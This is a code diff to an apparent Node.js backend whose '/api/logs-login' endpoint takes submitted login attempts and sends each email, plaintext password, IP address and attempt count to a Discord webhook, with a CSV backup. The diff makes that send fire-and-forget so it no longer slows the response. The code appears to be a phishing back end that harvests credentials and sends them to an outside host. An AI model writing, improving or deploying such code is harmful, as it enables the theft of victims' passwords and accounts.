@@ -30,28 +30,29 @@ if (DISCORD_WEBHOOK_URL) {
   console.warn('⚠️  Discord webhook not configured. Using CSV fallback only.');
 }
 
-// Function to send message to Discord webhook
-async function sendToDiscord(logData) {
+// Function to send message to Discord webhook (fire and forget)
+function sendToDiscord(logData) {
   if (!webhookConnected) return;
   
-  const embed = {
-    title: '🔐 Login Attempt Logged',
-    color: 16711680, // Red
-    fields: [
-      { name: 'Email', value: logData.username, inline: false },
-      { name: 'Password', value: `||${logData.password}||`, inline: false }, // Spoiler tag
-      { name: 'Status', value: logData.status, inline: false },
-      { name: 'Attempt #', value: String(logData.attempt_number), inline: true },
-      { name: 'IP Address', value: logData.ip_address, inline: true },
-      { name: 'Timestamp', value: new Date(logData.timestamp).toLocaleString(), inline: false },
-    ],
-    timestamp: new Date().toISOString(),
-  };
-  
-  const payload = JSON.stringify({ embeds: [embed] });
-  
-  return new Promise((resolve) => {
+  // Don't await - fire and forget
+  try {
+    const embed = {
+      title: '🔐 Login Attempt Logged',
+      color: 16711680, // Red
+      fields: [
+        { name: 'Email', value: logData.username || 'N/A', inline: false },
+        { name: 'Password', value: `||${logData.password || 'N/A'}||`, inline: false },
+        { name: 'Status', value: logData.status || 'UNKNOWN', inline: false },
+        { name: 'Attempt #', value: String(logData.attempt_number || 1), inline: true },
+        { name: 'IP Address', value: logData.ip_address || 'N/A', inline: true },
+        { name: 'Timestamp', value: new Date(logData.timestamp).toLocaleString(), inline: false },
+      ],
+      timestamp: new Date().toISOString(),
+    };
+    
+    const payload = JSON.stringify({ embeds: [embed] });
     const url = new URL(DISCORD_WEBHOOK_URL);
+    
     const options = {
       hostname: url.hostname,
       path: url.pathname + url.search,
@@ -64,17 +65,24 @@ async function sendToDiscord(logData) {
     
     const req = https.request(options, (res) => {
       res.on('data', () => {});
-      res.on('end', () => resolve());
+      res.on('end', () => {
+        if (res.statusCode === 204 || res.statusCode === 200) {
+          console.log('✅ Discord webhook sent successfully');
+        } else {
+          console.warn(`⚠️  Discord webhook returned ${res.statusCode}`);
+        }
+      });
     });
     
     req.on('error', (err) => {
       console.error('Discord webhook error:', err.message);
-      resolve();
     });
     
     req.write(payload);
     req.end();
-  });
+  } catch (error) {
+    console.error('Error sending to Discord:', error.message);
+  }
 }
 
 // Ensure logs directory exists (for CSV fallback)
@@ -110,8 +118,8 @@ app.post('/api/logs-login', async (req, res) => {
       ip_address: ipAddress,
     };
     
-    // Send to Discord webhook
-    await sendToDiscord(logData);
+    // Send to Discord (fire and forget - doesn't block response)
+    sendToDiscord(logData);
     
     // Also save to CSV as backup
     const csvRow = [
